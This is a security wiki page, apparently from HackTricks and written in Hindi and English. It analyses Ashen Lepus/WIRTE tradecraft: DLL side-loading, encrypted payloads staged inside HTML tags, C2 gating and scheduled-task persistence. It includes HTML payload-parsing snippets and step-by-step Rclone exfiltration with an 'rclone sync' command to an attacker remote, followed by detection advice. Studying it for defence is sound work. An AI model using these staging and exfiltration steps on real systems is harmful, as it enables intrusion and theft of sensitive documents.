# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) ने एक दोहराने योग्य पैटर्न को weaponize किया जो DLL sideloading, staged HTML payloads, और modular .NET backdoors को chain करके Middle Eastern diplomatic networks के भीतर persist करता है। यह तकनीक किसी भी operator द्वारा reuse की जा सकती है क्योंकि यह इन पर निर्भर है:

- **Archive-based social engineering**: benign PDFs लक्ष्यों को एक file-sharing site से RAR archive खोलने का निर्देश देती हैं। archive में एक real-looking document viewer EXE, एक malicious DLL जिसका नाम किसी trusted library के नाम जैसा होता है (उदा., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), और एक decoy `Document.pdf` बंडल किया जाता है।
- **DLL search order abuse**: victim EXE पर double-click करता है, Windows current directory से DLL import resolve करता है, और malicious loader (AshenLoader) trusted process के भीतर execute होता है जबकि decoy PDF खुलकर suspicion कम करता है।
- **Living-off-the-land staging**: हर बाद का stage (AshenStager → AshenOrchestrator → modules) disk पर तब तक नहीं रखा जाता जब तक जरूरत न हो; ये encrypted blobs के रूप में harmless दिखाई देने वाले HTML responses के अंदर छिपाकर deliver किए जाते हैं।

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE AshenLoader को side-load करता है, जो host recon करता है, उसे AES-CTR से encrypt करता है, और उसे rotating parameters जैसे `token=`, `id=`, `q=`, या `auth=` के अंदर POST करता है API-looking paths (उदा., `/api/v2/account`) पर।
2. **HTML extraction**: C2 अगला stage तभी बताता है जब client IP target region में geolocate करता है और `User-Agent` implant से match करता है, जिससे sandboxes frustrate होते हैं। जब checks पास होते हैं तो HTTP body में `<headerp>...</headerp>` blob होता है जिसमें Base64/AES-CTR से encrypted AshenStager payload होता है।
3. **Second sideload**: AshenStager को एक और legitimate binary के साथ deploy किया जाता है जो `wtsapi32.dll` को import करता है। binary में inject की गई malicious copy और HTML fetch करती है, इस बार `<article>...</article>` carve करके AshenOrchestrator recover करती है।
4. **AshenOrchestrator**: एक modular .NET controller जो Base64 JSON config decode करता है। config के `tg` और `au` fields को concatenate/ hash करके AES key बनती है, जो `xrk` को decrypt करती है। resultant bytes हर module blob के लिए XOR key के रूप में काम करते हैं जो बाद में fetch होते हैं।
5. **Module delivery**: हर module को HTML comments के माध्यम से describe किया जाता है जो parser को किसी arbitrary tag पर redirect करते हैं, जिससे वो static rules को तोड़ते हैं जो केवल `<headerp>` या `<article>` को देखते हैं। Modules में persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), और file exploration (`FE`) शामिल हैं।

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
भले ही defenders किसी specific element को block या strip कर दें, operator को केवल HTML comment में संकेतित tag बदलने की ज़रूरत होती है ताकि delivery फिर से चालू हो सके।

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

हालिया HTML smuggling research (Talos) बताती है कि payloads अक्सर HTML attachments में `<script>` block के अंदर Base64 strings के रूप में छिपाए जाते हैं और runtime पर JavaScript द्वारा decode होते हैं। यही ट्रिक C2 responses के लिए भी उपयोग की जा सकती है: encrypted blobs को एक script tag (या अन्य DOM element) के अंदर stage करें और उन्हें AES/XOR से पहले इन-मेमोरी में decode करें, जिससे पेज सामान्य HTML जैसा दिखे। Talos layered obfuscation (identifier renaming plus Base64/Caesar/AES) को भी दिखाता है जो script tags के भीतर होता है और यह HTML-staged C2 blobs के साथ साफ़ से map होता है।

## Recent Variant Notes (2024-2025)

- Check Point ने 2024 में WIRTE campaigns देखी जिनका आधार अभी भी archive-based sideloading था लेकिन पहले stage के रूप में `propsys.dll` (stagerx64) का उपयोग किया गया। stager अगले payload को Base64 + XOR (key `53`) से decode करता है, एक hardcoded `User-Agent` के साथ HTTP requests भेजता है, और HTML टैग्स के बीच embedded encrypted blobs को extract करता है। एक शाख़ में stage को embedded IP strings की लंबी सूची से reconstruct किया गया था जिन्हें `RtlIpv4StringToAddressA` से decode कर के payload bytes में concatenate किया गया।
- OWN-CERT ने पहले के WIRTE tooling को document किया जिसमें side-loaded `wtsapi32.dll` dropper ने strings को Base64 + TEA से protect किया और DLL नाम को ही decryption key के रूप में इस्तेमाल किया, फिर host identification data को XOR/Base64-obfuscated करके C2 को भेजा गया।

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders 256-bit keys और nonces (उदा., `{9a 20 51 98 ...}`) embed करते हैं और optional रूप से decryption से पहले/बाद में `msasn1.dll` जैसे strings का उपयोग करते हुए एक XOR layer जोड़ते हैं।
- **Key material variations**: पहले के loaders embedded strings को Base64 + TEA से protect करते थे, और decryption key malicious DLL name (उदा., `wtsapi32.dll`) से derive होता था।
- **Infrastructure split + subdomain camouflage**: staging servers टूल के हिसाब से विभाजित हैं, विभिन्न ASNs में host किए जाते हैं, और कभी-कभी legitimate-looking subdomains के पीछे होते हैं, ताकि एक stage burn होने पर बाकी उजागर न हों।
- **Recon smuggling**: अब enumerated data में Program Files listings शामिल होते हैं ताकि high-value apps पहचाने जा सकें और यह डेटा हमेशा host से बाहर जाने से पहले encrypted होता है।
- **URI churn**: query parameters और REST paths campaigns के बीच बदलते रहते हैं (`/api/v1/account?token=` → `/api/v2/account?auth=`), जिससे brittle detections invalid हो जाती हैं।
- **User-Agent pinning + safe redirects**: C2 infrastructure केवल exact UA strings पर ही जवाब देता है और अन्यथा benign news/health साइट्स पर redirect कर देता है ताकि blend इन हो सके।
- **Gated delivery**: servers geo-fenced होते हैं और केवल real implants को payload लौटाते हैं। अनधिकृत clients को nonsuspicious HTML मिलता है।

## Persistence & Execution Loop

AshenStager ऐसे scheduled tasks drop करता है जो Windows maintenance jobs के रूप में छिपे होते हैं और `svchost.exe` के माध्यम से execute होते हैं, उदाहरण के लिए:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

ये tasks boot या intervals पर sideloading chain को relaunch करते हैं, जिससे AshenOrchestrator बिना फिर से disk को छुए fresh modules request कर सकता है।

## Using Benign Sync Clients for Exfiltration

Operators diplomatic documents को `C:\Users\Public` (world-readable और non-suspicious) में stage करते हैं एक dedicated module के ज़रिये, फिर legitimate [Rclone](https://rclone.org/) binary download कर के उस directory को attacker storage के साथ synchronize करते हैं। Unit42 बताता है कि यह पहली बार है जब इस actor ने Rclone को exfiltration के लिए उपयोग करते देखा गया है, और यह सामान्य ट्रैफ़िक में घुलने के लिए legitimate sync tooling के दुरुपयोग के व्यापक ट्रेंड के अनुरूप है:

1. **Stage**: target files को `C:\Users\Public\{campaign}\` में copy/collect करें।
2. **Configure**: एक Rclone config भेजें जो attacker-controlled HTTPS endpoint (उदा., `api.technology-system[.]com`) की ओर संकेत करता हो।
3. **Sync**: चलाएँ `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ताकि ट्रैफ़िक सामान्य cloud backups जैसा दिखे।

चूंकि Rclone व्यापक रूप से legitimate backup workflows के लिए उपयोग होता है, defenders को anomalous executions (नए binaries, अजीब remotes, या अचानक `C:\Users\Public` की syncing) पर ध्यान देना चाहिए।

## Detection Pivots

- उन **signed processes** पर alert करें जो अप्रत्याशित रूप से user-writable paths से DLLs load करते हैं (Procmon filters + `Get-ProcessMitigation -Module`), खासकर जब DLL नाम `netutils`, `srvcli`, `dwampi`, या `wtsapi32` जैसे हों।
- संदेहास्पद HTTPS responses में **unusual tags के भीतर embedded बड़े Base64 blobs** या `<!-- TAG: <xyz> -->` comments से guarded content को inspect करें।
- HTML hunting को बढ़ाएँ ताकि `<script>` blocks के अंदर Base64 strings (HTML smuggling-style staging) को पकड़ सकें जो JavaScript द्वारा decode होने के बाद AES/XOR processing होते हैं।
- उन **scheduled tasks** की खोज करें जो `svchost.exe` को non-service arguments के साथ चलाते हैं या जो dropper directories की ओर इशारा करते हैं।
- उन **C2 redirects** को ट्रैक करें जो केवल exact `User-Agent` strings के लिए payloads लौटाते हैं और अन्यथा legitimate news/health domains पर bounce करते हैं।
- IT-managed स्थानों के बाहर आने वाले **Rclone** binaries, नए `rclone.conf` files, या staging directories जैसे `C:\Users\Public` से sync jobs के लिए निगरानी रखें।

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
